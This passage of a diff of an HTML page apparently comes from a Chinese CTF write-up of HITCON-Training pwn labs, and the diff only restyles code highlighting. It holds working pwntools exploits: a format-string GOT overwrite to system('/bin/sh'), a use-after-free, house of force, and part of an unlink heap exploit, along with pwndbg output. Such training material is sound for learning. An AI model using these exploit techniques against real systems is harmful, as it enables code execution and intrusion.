+</span><span style="color:#e6db74">pwndbg&gt; x/3s 0x804a060
+</span><span style="color:#e6db74">0x804a060 &lt;buf&gt;:	&#34;</span><span style="color:#e6db74">%211c</span><span style="color:#e6db74">%11$hhn%31&#34;...
+</span><span style="color:#e6db74">0x804a06f &lt;buf+15&gt;:	&#34;325c%7$hn444444&#34;...
+</span><span style="color:#e6db74">0x804a07e &lt;buf+30&gt;:	&#34;44&#34;
+</span><span style="color:#e6db74">pwndbg&gt; stack 25
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae9
+</span><span style="color:#e6db74">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+</span><span style="color:#e6db74">09:0024│      0xffa077e4 ◂— 0x0
+</span><span style="color:#e6db74">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
+</span><span style="color:#e6db74">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
+</span><span style="color:#e6db74">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">0e:0038│      0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">10:0040│      0xffa07800 ◂— 0x1
+</span><span style="color:#e6db74">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">12:0048│      0xffa07808 ◂— 0x0
+</span><span style="color:#e6db74">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">14:0050│      0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d46930
+</span><span style="color:#e6db74">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
+</span><span style="color:#e6db74">17:005c│      0xffa0781c ◂— 0x0
+</span><span style="color:#e6db74">... ↓
+</span><span style="color:#e6db74">pwndbg&gt; n
+</span><span style="color:#e6db74">0x08048540 in do_fmt ()
+</span><span style="color:#e6db74">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+</span><span style="color:#e6db74">────────────────────────[ REGISTERS ]────────────────────────
+</span><span style="color:#e6db74"> EAX  0x7b38
+</span><span style="color:#e6db74"> EBX  0x0
+</span><span style="color:#e6db74"> ECX  0xffa052a0 ◂— 0x20202020 (&#39;    &#39;)
+</span><span style="color:#e6db74"> EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0
+</span><span style="color:#e6db74"> EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74"> ESI  0x1
+</span><span style="color:#e6db74"> EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74"> ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
+</span><span style="color:#e6db74"> EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">─────────────────────────[ DISASM ]──────────────────────────
+</span><span style="color:#e6db74">   0x804853b &lt;do_fmt+64&gt;    call   printf@plt &lt;0x80483a0&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"> ► 0x8048540 &lt;do_fmt+69&gt;    add    esp, 0x10
+</span><span style="color:#e6db74">   0x8048543 &lt;do_fmt+72&gt;    jmp    do_fmt+6 &lt;0x8048501&gt;
+</span><span style="color:#e6db74">    ↓
+</span><span style="color:#e6db74">   0x8048501 &lt;do_fmt+6&gt;     sub    esp, 4
+</span><span style="color:#e6db74">   0x8048504 &lt;do_fmt+9&gt;     push   0xc8
+</span><span style="color:#e6db74">   0x8048509 &lt;do_fmt+14&gt;    push   buf &lt;0x804a060&gt;
+</span><span style="color:#e6db74">   0x804850e &lt;do_fmt+19&gt;    push   0
+</span><span style="color:#e6db74">   0x8048510 &lt;do_fmt+21&gt;    call   read@plt &lt;0x8048390&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">   0x8048515 &lt;do_fmt+26&gt;    add    esp, 0x10
+</span><span style="color:#e6db74">   0x8048518 &lt;do_fmt+29&gt;    sub    esp, 4
+</span><span style="color:#e6db74">   0x804851b &lt;do_fmt+32&gt;    push   4
+</span><span style="color:#e6db74">──────────────────────────[ STACK ]──────────────────────────
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
+</span><span style="color:#e6db74">────────────────────────[ BACKTRACE ]────────────────────────
+</span><span style="color:#e6db74"> ► f 0  8048540 do_fmt+69
+</span><span style="color:#e6db74">   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16
+</span><span style="color:#e6db74">   f 2 f7eb0d60 _IO_2_1_stdout_
+</span><span style="color:#e6db74">   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18
+</span><span style="color:#e6db74">   f 4 f7eb03dc __exit_funcs
+</span><span style="color:#e6db74">   f 5 ffa07810
+</span><span style="color:#e6db74">   f 6 f7d15276 __libc_start_main+246
+</span><span style="color:#e6db74">pwndbg&gt; stack 25
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
+</span><span style="color:#e6db74">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+</span><span style="color:#e6db74">09:0024│      0xffa077e4 ◂— 0x0
+</span><span style="color:#e6db74">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
+</span><span style="color:#e6db74">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
+</span><span style="color:#e6db74">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">0e:0038│      0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">10:0040│      0xffa07800 ◂— 0x1
+</span><span style="color:#e6db74">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">12:0048│      0xffa07808 ◂— 0x0
+</span><span style="color:#e6db74">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">14:0050│      0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b30
+</span><span style="color:#e6db74">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
+</span><span style="color:#e6db74">17:005c│      0xffa0781c ◂— 0x0
+</span><span style="color:#e6db74">... ↓
+</span><span style="color:#e6db74">pwndbg&gt; got
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">GOT protection: Partial RELRO | GOT functions: 6
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[0x804a00c] read@GLIBC_2.0 -&gt; 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0
+</span><span style="color:#e6db74">[0x804a010] printf@GLIBC_2.0 -&gt; 0xf7d37b30 (system) ◂— sub    esp, 0xc
+</span><span style="color:#e6db74">[0x804a014] puts@GLIBC_2.0 -&gt; 0xf7d5c870 (puts) ◂— push   ebp
+</span><span style="color:#e6db74">[0x804a018] __libc_start_main@GLIBC_2.0 -&gt; 0xf7d15180 (__libc_start_main) ◂— push   ebp
+</span><span style="color:#e6db74">[0x804a01c] setvbuf@GLIBC_2.0 -&gt; 0xf7d5cff0 (setvbuf) ◂— push   ebp
+</span><span style="color:#e6db74">[0x804a020] strncmp@GLIBC_2.0 -&gt; 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#75715e">#  gdb.attach(io, &#34;b *do_fmt+64\nc&#34;)</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%{}c%{}$hhn&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xb</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%{}c%{}$hn&#34;</span><span style="color:#f92672">.</span>format((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>) <span style="color:#f92672">-</span> (libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>), <span style="color:#ae81ff">0x7</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;44444444</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
 info(payload)
-io.sendafter(&quot;33333333&quot;, payload)
+io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;33333333&#34;</span>, payload)
 pause()
 
-io.sendafter(&quot;44444444&quot;, &quot;/bin/sh\0&quot;)
+io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;44444444&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
 
-io.interactive()
-io.close()
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()</code></pre></div>
 <blockquote>
 <p>可以通过设置标记变量(如我 exp 中的 11111111, 22222222 等)进行定位</p>
 </blockquote>
@@ -956,57 +964,54 @@ io.close()
 <p>最简单的一种 uaf 利用，结构体中有函数指针，通过 uaf 控制该函数指针指向 magic 函数即可，uaf 的介绍可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf"><strong>slide</strong></a></p>
 
 <p>exp:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab10 [master<span style="color:#960050;background-color:#1e0010">●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab10 [master●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
 
-from pwn import *
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debug</span>():
+    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+    gdb<span style="color:#f92672">.</span>attach(io)
 
-def debug():
-    raw_input(&quot;DEBUG: &quot;)
-    gdb.attach(io)
-
-io = process(&quot;./hacknote&quot;)
-elf = ELF(&quot;./hacknote&quot;)
-magic_elf = elf.symbols[&quot;magic&quot;]
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./hacknote&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./hacknote&#34;</span>)
+magic_elf <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;magic&#34;</span>]
 
 
-def addNote(size, content):
-    io.sendafter(&quot;choice :&quot;, &quot;1&quot;)
-    io.sendafter(&quot;size &quot;, str(size))
-    io.sendafter(&quot;Content :&quot;, content)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addNote</span>(size, content):
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;size &#34;</span>, str(size))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Content :&#34;</span>, content)
 
-def delNote(idx):
-    #  debug()
-    io.sendafter(&quot;choice :&quot;, &quot;2&quot;)
-    io.sendafter(&quot;Index :&quot;, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delNote</span>(idx):
+    <span style="color:#75715e">#  debug()</span>
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Index :&#34;</span>, str(idx))
 
-def printNote(idx):
-    #  debug()
-    io.sendafter(&quot;choice :&quot;, &quot;3&quot;)
-    io.sendafter(&quot;Index :&quot;, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printNote</span>(idx):
+    <span style="color:#75715e">#  debug()</span>
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Index :&#34;</span>, str(idx))
 
-def uaf():
-    addNote(24, &quot;a&quot; * 24)
-    addNote(24, &quot;b&quot; * 24)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">uaf</span>():
+    addNote(<span style="color:#ae81ff">24</span>, <span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>)
+    addNote(<span style="color:#ae81ff">24</span>, <span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>)
 
-    delNote(0)
-    delNote(1)
-    #  debug()
-    addNote(8,p32(magic_elf))
+    delNote(<span style="color:#ae81ff">0</span>)
+    delNote(<span style="color:#ae81ff">1</span>)
+    <span style="color:#75715e">#  debug()</span>
+    addNote(<span style="color:#ae81ff">8</span>,p32(magic_elf))
 
-    printNote(0)
+    printNote(<span style="color:#ae81ff">0</span>)
 
-if __name__ == &quot;__main__&quot;:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
     uaf()
-    io.interactive()
-    io.close()
-</code></pre>
-
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <blockquote>
 <p>说一下怎么修复 IDA 中的结构体</p>
 
@@ -1044,52 +1049,49 @@ if __name__ == &quot;__main__&quot;:
 <h4 id="house-of-force">house of force</h4>
 
 <p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab11 [master<span style="color:#960050;background-color:#1e0010">●</span>] cat hof<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab11 [master●] cat hof.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> zio <span style="color:#f92672">import</span> l64
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+<span style="color:#f92672">import</span> sys
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
 
-from pwn import *
-from zio import l64
-from time import sleep
-import sys
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./bamboobox&#34;</span>)
 
-io = process(&quot;./bamboobox&quot;)
-
-def DEBUG():
-	raw_input(&quot;DEBUG: &quot;)
-	gdb.attach(io)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>():
+	raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+	gdb<span style="color:#f92672">.</span>attach(io)
 
 
-def add(length, name):
-    io.sendlineafter(&quot;:&quot;, &quot;2&quot;)
-    io.sendlineafter(&quot;:&quot;, str(length))
-    io.sendafter(&quot;:&quot;, name)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(length, name):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;:&#34;</span>, name)
 
-def change(idx, length, name):
-    io.sendlineafter(&quot;:&quot;, &quot;3&quot;)
-    io.sendlineafter(&quot;:&quot;, str(idx))
-    io.sendlineafter(&quot;:&quot;, str(length))
-    io.sendafter(&quot;:&quot;, name)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change</span>(idx, length, name):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(idx))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;:&#34;</span>, name)
 
-def exit():
-    io.sendlineafter(&quot;:&quot;, &quot;5&quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit</span>():
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;5&#34;</span>)
 
-if __name__ == &quot;__main__&quot;:
-    add(0x60, cyclic(0x60))
-    #  DEBUG()
-    change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
-    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa') # -(sizeof(item)) - sizeof(box) - 0x10
-    add(0x10, p64(ELF(&quot;./bamboobox&quot;).sym['magic']) * 2)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    add(<span style="color:#ae81ff">0x60</span>, cyclic(<span style="color:#ae81ff">0x60</span>))
+    <span style="color:#75715e">#  DEBUG()</span>
+    change(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, cyclic(<span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> l64(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+    add(<span style="color:#f92672">-</span>(<span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;aaaa&#39;</span>) <span style="color:#75715e"># -(sizeof(item)) - sizeof(box) - 0x10</span>
+    add(<span style="color:#ae81ff">0x10</span>, p64(ELF(<span style="color:#e6db74">&#34;./bamboobox&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;magic&#39;</span>]) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)
     exit()
 
-    io.interactive()
-    io.close()
-</code></pre>
-
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <blockquote>
 <p>快速确定需要 malloc 的大数/负数可以使用 Pwngdb 的 force 功能, 这里我做了一个 <a href="https://github.com/0x01f/Pwngdb">fork</a>, 把 Pwngdb 和 pwndbg 的功能做了一个合并</p>
 </blockquote>
@@ -1097,133 +1099,126 @@ if __name__ == &quot;__main__&quot;:
 <h4 id="unlink">unlink</h4>
 
 <p>至于 unlink，在这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf">slide</a>中有较大篇幅的介绍，就不在说明原理了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab11 [master<span style="color:#960050;background-color:#1e0010">●</span>] cat unlink<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab11 [master●] cat unlink.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+<span style="color:#f92672">import</span> sys
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
 
-from pwn import *
-from time import sleep
-import sys
-context.arch = 'amd64'
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./bamboobox&#34;</span>)
+<span style="color:#75715e"># process(&#34;./bamboobox&#34;).libc will assign libc.address but ELF(&#34;./bamboobox&#34;) won&#39;t</span>
+<span style="color:#75715e">#  libc = io.libc</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bamboobox&#34;</span>)
+libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
 
-io = process(&quot;./bamboobox&quot;)
-# process(&quot;./bamboobox&quot;).libc will assign libc.address but ELF(&quot;./bamboobox&quot;) won't
-#  libc = io.libc
-elf = ELF(&quot;./bamboobox&quot;)
-libc = elf.libc
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>():
+	raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+	gdb<span style="color:#f92672">.</span>attach(io)
 
-def DEBUG():
-	raw_input(&quot;DEBUG: &quot;)
-	gdb.attach(io)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>():
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
 
-def show():
-    io.sendlineafter(&quot;:&quot;, &quot;1&quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(length, name):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;:&#34;</span>, name)
 
-def add(length, name):
-    io.sendlineafter(&quot;:&quot;, &quot;2&quot;)
-    io.sendlineafter(&quot;:&quot;, str(length))
-    io.sendafter(&quot;:&quot;, name)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change</span>(idx, length, name):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
